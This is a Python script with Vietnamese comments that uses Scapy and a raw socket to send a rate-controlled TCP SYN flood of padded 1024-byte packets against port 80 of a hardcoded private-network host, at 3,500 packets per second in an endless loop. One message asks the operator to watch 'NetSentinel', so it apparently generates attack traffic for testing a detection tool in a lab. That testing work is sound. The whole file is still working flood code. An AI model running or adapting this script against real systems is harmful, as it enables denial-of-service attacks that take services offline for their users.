from scapy.all import IP, TCP, Raw
import socket
import os
import time

def attack_tcp_flood():
    # --- CẤU HÌNH ---
    dst_ip = "192.168.80.163"
    src_ip = "192.168.80.130"
    target_port = 80
    fixed_sport = 44444 
    
    target_pps = 3500      # TỐC ĐỘ MỤC TIÊU: 3500 gói/s
    payload_size = 1024    # Kích thước payload
    
    # Payload để kéo băng thông
    payload = Raw(b"X" * payload_size) 
    
    print(f"ĐANG CHUẨN BỊ TẤN CÔNG TCP SYN FLOOD - MỤC TIÊU: {target_pps} PPS...")
    
    # 1. Tạo gói tin bằng Scapy (Chỉ làm 1 lần)
    pkt = IP(src=src_ip, dst=dst_ip, ttl=254) / TCP(sport=fixed_sport, dport=target_port, flags="S") / payload
    
    # 2. Biên dịch gói tin ra dạng Byte tĩnh
    raw_bytes = bytes(pkt)
    
    # 3. Tạo Raw Socket của Python
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print(" Lỗi quyền: Vui lòng chạy bằng lệnh: sudo python3 d1.py")
        return

    print(f" Đang gửi gói TCP ({target_pps} gói/s)... Nhìn sang NetSentinel ngay!")
    
    count = 0
    start_time = time.time()
    
    # --- THUẬT TOÁN ĐIỀU TỐC ---
    # Bắn theo từng lô (batch) 50 gói để giảm tải cho CPU
    batch_size = 50
    sleep_interval = batch_size / target_pps  # Thời gian chuẩn để gửi xong 50 gói
    
    try:
        while True:
            batch_start = time.time()
            
            # Xả nhanh 50 gói
            for _ in range(batch_size):
                s.sendto(raw_bytes, (dst_ip, 0))
                count += 1
            
            # Tính thời gian đã mất cho lô vừa rồi
            elapsed = time.time() - batch_start
            
            # Bù trừ thời gian: Nếu máy xả 50 gói quá nhanh, cho CPU nghỉ một chút
            if elapsed < sleep_interval:
                time.sleep(sleep_interval - elapsed)
                
            # In tốc độ mỗi 3500 gói (tương đương 1 giây 1 lần)
            if count % target_pps == 0:
                total_elapsed = time.time() - start_time
                pps = count / total_elapsed
                print(f"⚡ Đã gửi {count:,} gói | Tốc độ thực tế: {pps:,.0f} gói/s")
                
    except KeyboardInterrupt:
        total_elapsed = time.time() - start_time
        print(f"\n Đã dừng. Tổng cộng: {count:,} gói tin TCP trong {total_elapsed:.2f} giây.")
        if total_elapsed > 0:
            print(f"Tốc độ trung bình: {count/total_elapsed:,.0f} gói/giây")
    finally:
        s.close()

if __name__ == "__main__":
    if os.getuid() != 0:
        print("Lỗi")
    else:
        attack_tcp_flood()
